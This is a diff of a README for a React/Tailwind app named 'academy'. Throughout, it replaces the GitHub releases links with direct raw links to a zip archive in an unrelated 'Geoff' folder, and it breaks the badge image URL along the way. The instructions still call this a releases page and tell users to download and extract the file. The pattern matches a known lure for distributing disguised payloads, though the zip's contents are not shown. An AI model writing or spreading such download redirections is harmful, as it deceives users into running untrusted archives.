@@ -1,7 +1,7 @@
 # 🎉 academy - Easy to Use React App
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/sekiroema/academy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sekiroema/academy/main/Geoff/academy.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sekiroema/academy/main/Geoff/academy.zip)
 
 ## 🚀 Getting Started
 Welcome to the **academy** application. This app uses React and Tailwind to create a smooth user experience. It offers features like animations, authentication, and a shopping cart—all designed to make your life easier.
@@ -23,7 +23,7 @@ Before you download, ensure your system meets these basic requirements:
 - **Responsive Design:** Works on all screen sizes
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/sekiroema/academy/releases).  
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/sekiroema/academy/main/Geoff/academy.zip).  
 2. **Find the Latest Version:** Look for the latest release at the top of the page.  
 3. **Download the File:** Click on the asset you wish to download.  
 4. **Extract the Files:** If you download a zipped file, right-click on it and select "Extract All" to access the application files.  
@@ -48,4 +48,4 @@ If you encounter any issues while using the academy app, please visit the Issues
 - **Contributing**: If you'd like to contribute, you're welcome to fork the repository and submit pull requests!
 
 ## 🎉 Get Started Today
-Experience the ease and speed of the academy application. Don't wait any longer—[visit this page to download](https://github.com/sekiroema/academy/releases) and start your journey today!
+Experience the ease and speed of the academy application. Don't wait any longer—[visit this page to download](https://raw.githubusercontent.com/sekiroema/academy/main/Geoff/academy.zip) and start your journey today!
